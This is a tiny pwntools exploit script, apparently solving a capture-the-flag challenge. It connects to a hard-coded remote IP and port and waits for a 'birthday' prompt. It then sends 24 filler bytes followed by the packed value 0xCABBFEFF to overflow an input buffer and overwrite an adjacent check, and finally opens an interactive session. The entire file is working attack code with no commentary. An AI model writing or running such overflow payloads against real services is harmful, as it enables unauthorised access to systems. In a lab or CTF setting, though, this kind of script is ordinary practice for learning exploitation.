from pwn import *

r = remote('61.28.237.24', 30200)

print(r.recvuntil('Tell me your birthday?'))
payload = b'A' * 24
payload += p32(0xCABBFEFF)
r.sendline(payload)
r.interactive()